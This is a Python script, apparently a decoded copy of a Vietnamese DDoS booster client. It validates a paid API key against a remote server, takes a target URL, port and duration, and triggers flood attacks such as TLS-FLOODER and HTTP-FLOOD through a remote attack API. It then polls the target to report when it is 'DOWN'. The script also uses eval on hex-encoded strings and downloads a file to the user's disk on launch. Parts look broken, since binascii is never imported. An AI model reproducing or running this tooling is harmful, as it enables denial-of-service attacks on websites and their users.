#Decode By Nguyen Le Tri Loc ( Vodka Coder )
#Type File: out.py
#Encode: Hyperion [ Billythegoat ]
import os
import time
import requests
import sys
from colorama import init,Fore,Back
os.environ['PYGAME_HIDE_SUPPORT_PROMPT']='1'
import pygame
init()
def download_music(url,noiluu_nhac):
    response=requests.get(url)
    if response.status_code==200:
        with open(noiluu_nhac,'wb')as f:
            f.write(response.content)
def play_music(duongdan):
    pygame.mixer.music.load(duongdan)
    pygame.mixer.music.play()
pygame.mixer.init()
pygame.mixer.set_num_channels(0)
tainhacxuong='https://files.catbox.moe/yxjx5d.mp3'
noiluu_nhac=''
if os.name=='posix':
    noiluu_nhac='/sdcard/thanhdieu.mp3'
elif os.name=='nt':
    noiluu_nhac='C:\\ProgramData\\thanhdieu.mp3'
download_music(tainhacxuong,noiluu_nhac)
pygame.mixer.init()
play_music(noiluu_nhac)
class ThanhDieuMainDDOS_0xca1:
    def __init__(self,key):
        os.system('cls')
        os.system('title TDTV1 - Tool DDoS API cURL')
        self.host=None
        self.portnum=None
        self.threads=None
        self.key=key
    def thanhdieu_welcome__(self):
        os.system('cls')
        banner='  \n         ═══════════════════════════════════════════════════════════                                  \n        '
        print(Fore.YELLOW+banner)
        print(Fore.WHITE+'ㅤㅤ             ㅤ ╲ WELCOME TO TOOL DDOS API ╱')
        print(
            Fore.WHITE
+'ㅤㅤㅤㅤ[+] All Method: TLS-FLOODER - HTTP-LOAD - DESTROY - HTTP-FLOOD'
)
        print(Fore.WHITE+'ㅤㅤㅤㅤ[+] Example Target: https://example.com/ 443 60')
        print(Fore.WHITE+'ㅤㅤㅤㅤ[+] Get Key Free: https://thanhdieu.com/API/?=KeyToDay')
        print(Fore.YELLOW+banner)
    def thanhdieu_main__(self,ngayhethan):
        os.system('cls')
        banner='\n         ████████╗    ██████╗     ████████╗    ██╗   ██╗     ██╗\n         ╚══██╔══╝    ██╔══██╗    ╚══██╔══╝    ██║   ██║    ███║\n            ██║       ██║  ██║       ██║       ██║   ██║    ╚██║\n            ██║       ██║  ██║       ██║       ╚██╗ ██╔╝     ██║\n            ██║       ██████╔╝       ██║        ╚████╔╝      ██║\n            ╚═╝       ╚═════╝        ╚═╝         ╚═══╝       ╚═╝                                         \n        '
        print(Fore.RED+banner)
        print(
            Fore.YELLOW
+'ㅤㅤㅤㅤㅤㅤ[+] An Advanced DDOS Tool Using API DDOS Written in Python [+]'
)
        print(Fore.YELLOW+'ㅤㅤㅤㅤㅤㅤ[+] Developer: ThanhDieuTV [Manager]')
        print(Fore.YELLOW+'ㅤㅤㅤㅤㅤㅤ[+] Version Tool: V1.0.0')
        print(Fore.RED+eval(binascii.unhexlify(b'6622e385a4e385a4e385a4e385a4e385a4e385a44b65792045787069726174696f6e3a207b6e67617968657468616e7d22').decode('8ftu'[::+-+-(-(+1))])))
    def chon_method(self):
        print(
            Fore.LIGHTMAGENTA_EX
+'╔═══'
+Fore.LIGHTMAGENTA_EX
+'[Choose'
+Fore.LIGHTMAGENTA_EX
+' '
+Fore.LIGHTMAGENTA_EX
+'Method'
+Fore.LIGHTMAGENTA_EX
+']'
+Fore.LIGHTMAGENTA_EX
)
        print(
            Fore.LIGHTMAGENTA_EX+'╚══'+'[38;2;0;255;189m> '+Fore.WHITE,end=''
)
        default_method='TLS-FLOODER'
        chon_method=input(default_method)
        if not chon_method:
            chon_method=default_method
        else:
            chon_method=chon_method.strip()
        return chon_method
    def check_website(self,website_url):
        if website_url.startswith('https://')or website_url.startswith('http://'):
            return True
        else:
            return False
    def check_port(self,port):
        if port>=80 and port<=443:
            return True
        else:
            return False
    def check_thoigian(self,thoigian):
        if thoigian>=30 and thoigian<=60:
            return True
        else:
            return False
    def check_port_format(self,port_input):
        if port_input.isdigit():
            port=int(port_input)
            if self.check_port(port):
                return port
            else:
                print(Fore.RED+'Default port 443.')
        else:
            print(Fore.RED+'Port is not in the correct format.')
        return None
    def run_ddos_attack(self,website_url,port,thoigian,phuongphap):
        website_url=eval(binascii.unhexlify(b'66227b776562736974655f75726c7d3a7b706f72747d22').decode('8ftu'[::+-+-(-(+1))]))
        api_url=eval(binascii.unhexlify(b'662268747470733a2f2f7468616e68646965752e636f6d2f4150492f746f6f6c2d64646f732e7068703f6b65793d7468616e6864696575746f6f6c64646f7326706f72743d7b706f72747d2674696d653d7b74686f696769616e7d266d6574686f643d7b7068756f6e67706861707d26686f73743d7b776562736974655f75726c7d22').decode('8ftu'[::+-+-(-(+1))]))
        response=requests.get(api_url)
        if response.status_code==200:
            thanhdieuattack_0xac2=True
        else:
            thanhdieuattack_0xac2=False
        code_mau={'Send attack to':Fore.GREEN,'server is DOWN':Fore.RED}
        if thanhdieuattack_0xac2:
            start_time=time.time()
            elapsed_time=0
            while elapsed_time<thoigian:
                print(
                    eval(binascii.unhexlify(b'66227b466f72652e475245454e7d53656e642061747461636b20746f7b466f72652e52455345547d207b776562736974655f75726c7d202d3e205b4d6574686f642f7b7068756f6e67706861707d5d22').decode('8ftu'[::+-+-(-(+1))]))
)
                if not self.__tdtv_checkwebsite(website_url):
                    print(eval(binascii.unhexlify(b'66227b776562736974655f75726c7d205c3033335b39316d73657276657220697320444f574e5c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
                    break
                time.sleep(0.01)
                elapsed_time=time.time()-start_time
            if not self.__tdtv_checkwebsite(website_url):
                print(eval(binascii.unhexlify(b'66227b776562736974655f75726c7d205c3033335b39316d73657276657220697320444f574e5c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
        else:
            start_time=time.time()
            elapsed_time=0
            while elapsed_time<thoigian:
                print(
                    eval(binascii.unhexlify(b'66227b636f64655f6d61755b274661696c2041747461636b275d7d4661696c2041747461636b207b776562736974655f75726c7d202d3e205b5461726765742f7b7068756f6e67706861707d5d22').decode('8ftu'[::+-+-(-(+1))]))
)
                if not self.__tdtv_checkwebsite(website_url):
                    print(eval(binascii.unhexlify(b'66227b776562736974655f75726c7d205c3033335b39316d73657276657220697320444f574e5c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
                    break
                time.sleep(0.2)
                elapsed_time=time.time()-start_time
        start_time=time.time()
        while time.time()-start_time<thoigian:
            if self.__tdtv_checkwebsite(website_url):
                print(eval(binascii.unhexlify(b'66225c3033335b39336d41747461636b2074696d6520686173206265656e20726561636865645c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
                print(eval(binascii.unhexlify(b'66225c3033335b39336d4578697420546f6f6c2044446f53202d2044756520746f2054696d6520457870697265645c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
                sys.exit()
            else:
                print(eval(binascii.unhexlify(b'66227b776562736974655f75726c7d205c3033335b39316d73657276657220697320444f574e5c3033335b306d22').decode('8ftu'[::+-+-(-(+1))])))
            time.sleep(0.2)
    def __tdtv_checkwebsite(self,website_url):
        try:
            response=requests.get(website_url)
            if response.status_code==200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False
blacklisted=[
    'https://usa.gov',
    'https://fbi.gov',
    'https://nasa.gov',
    'https://google.com',
    'https://translate.google.com',
    'https://thanhdieu.com',
    'https://github.com',
    'https://www.youtube.com',
    'https://www.facebook.com',
    'https://chat.openai.com',
    'https://shopee.vn',
    'https://mail.google.com',
    'https://tiktok.com',
    'https://instagram.com',
    'https://twitter.com',
]
def is_valid_url(url):
    if url.startswith('https://')or url.startswith('http://'):
        return True
    else:
        return False
def display_error_msg(error_msg):
    print(Fore.RED+eval(binascii.unhexlify(b'66224572726f723a207b6572726f725f6d73677d22').decode('8ftu'[::+-+-(-(+1))]))+Fore.RESET)
if __name__=='__main__':
    tool=ThanhDieuMainDDOS_0xca1(key=None)
    tool.thanhdieu_welcome__()
    key_file='key.txt'
    ngayhethan=None
    if os.path.exists(key_file):
        with open(key_file,'r')as f:
            key=f.readline().strip()
    else:
        key=input(Fore.YELLOW+'Enter API Key: '+Fore.RESET)
    __thanhdieu_checkey=(
        eval(binascii.unhexlify(b'662268747470733a2f2f7468616e68646965752e636f6d2f626f6f737465722f6170692f636865636b2d6b65792d64646f732e7068703f6b65793d7b6b65797d22').decode('8ftu'[::+-+-(-(+1))]))
)
    response=requests.get(__thanhdieu_checkey)
    while response.status_code !=200 or response.json().get('status')!='success':
        error_msg=response.json().get('msg')
        if error_msg:
            display_error_msg(error_msg)
        else:
            print(Fore.RED+'Key does not exist or is invalid.')
        key=input(Fore.YELLOW+'Enter API Key: '+Fore.RESET)
        __thanhdieu_checkey=(
            eval(binascii.unhexlify(b'662268747470733a2f2f7468616e68646965752e636f6d2f626f6f737465722f6170692f636865636b2d6b65792d64646f732e7068703f6b65793d7b6b65797d22').decode('8ftu'[::+-+-(-(+1))]))
)
        response=requests.get(__thanhdieu_checkey)
    ngaytao=response.json().get('create')
    ngayhethan=response.json().get('end')
    if ngayhethan:
        time.sleep(1)
        print(Fore.GREEN+'Đã kích hoạt API KEY.')
        time.sleep(0.5)
        for i in range(3,0,-1):
            print(Fore.YELLOW+eval(binascii.unhexlify(b'6622436f6e6e65637420746f2070616e656c2064646f73207b697d207365636f6e64732e2e2e22').decode('8ftu'[::+-+-(-(+1))])))
            time.sleep(0.4)
    else:
        print(Fore.RED+'Key không tồn tại.')
    with open(key_file,'w')as f:
        f.write(key)
    if ngayhethan:
        tool.thanhdieu_main__(ngayhethan)
method=tool.chon_method()
while method not in['TLS-FLOODER','HTTP-LOAD','DESTROY','HTTP-FLOOD']:
    print(
        Fore.RED
+'Vui lòng chọn một trong các method sau: \'TLS-FLOODER\', \'HTTP-LOAD\', \'DESTROY\', \'HTTP-FLOOD\'.'
)
    method=tool.chon_method()
def is_blacklisted(url):
    cleaned_url=url.replace('www.','')
    return cleaned_url in blacklisted
pink_prompt=Fore.MAGENTA+'﹝•﹞'+Fore.RESET
website_url=input(pink_prompt+'Target URL: ')
while not is_valid_url(website_url)or is_blacklisted(website_url):
    if not is_valid_url(website_url):
        print(Fore.RED+'Vui lòng nhập một địa chỉ URL hợp lệ.')
    elif is_blacklisted(website_url):
        print(Fore.RED+'Địa chỉ URL này nằm trong danh sách cấm.')
    website_url=input(pink_prompt+'Target URL: ')
while True:
    port_input=input(pink_prompt+'Target Port: ')
    if port_input.isdigit():
        port=int(port_input)
        if tool.check_port(port):
            break
        else:
            print(Fore.RED+'Default port 443.')
    else:
        print(Fore.RED+'Port is not in the correct format.')
thoigian=int(input(pink_prompt+'Target Time: '))
while not tool.check_thoigian(thoigian):
    print(Fore.RED+'Max time 30-60s.')
    thoigian=int(input(pink_prompt+'Target Time: '))
tool.run_ddos_attack(website_url,port,thoigian,method)
